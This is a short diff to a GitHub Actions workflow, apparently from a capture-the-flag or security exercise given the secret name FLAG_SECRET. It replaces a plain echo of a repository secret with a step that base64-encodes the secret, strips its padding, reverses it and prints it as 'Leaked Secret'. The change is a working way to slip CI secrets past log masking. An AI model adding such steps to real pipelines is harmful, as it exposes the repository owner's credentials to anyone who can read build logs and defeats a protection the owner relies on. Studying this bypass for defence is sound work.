@@ -9,8 +9,9 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@v3
 
-      - name: Print secret in clear text
+      - name: Obfuscate and print secret
         run: |
-          echo -n "$API_SECRET"
+          MODIFIED_SECRET=$(echo -n $API_SECRET | base64 | tr -d '=' | rev)
+          echo "Leaked Secret: $MODIFIED_SECRET"
         env:
           API_SECRET: ${{ secrets.FLAG_SECRET }}
